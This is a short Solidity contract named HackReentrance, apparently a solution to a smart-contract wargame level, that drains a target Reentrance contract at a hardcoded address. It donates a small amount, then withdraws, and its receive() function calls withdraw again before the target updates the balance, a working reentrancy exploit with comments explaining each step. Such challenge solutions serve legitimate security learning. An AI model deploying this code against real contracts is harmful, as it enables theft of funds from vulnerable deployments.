// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; // Latest solidity version

import '../contracts/Reentrancy.sol';

contract HackReentrance {
    // Complete with the instance's address
    Reentrance public originalContract = Reentrance(payable(0x857BF19E0aB679402d679ca9f2b73BE72CcB3140));

    // This is a way to send Ether without using the console
    // Much easier than instantiating a contract
    function Init() public payable {}

    function attack() public {
        originalContract.donate{value: 1000000000000000}(address(this));

        originalContract.withdraw(1000000000000000);
    }

    receive() external payable {
        // This way when the hacked contract sends you ether,
        // your fallback function is going to make a withdraw before you're balance gets updated
        originalContract.withdraw(1000000000000000);
    }
}
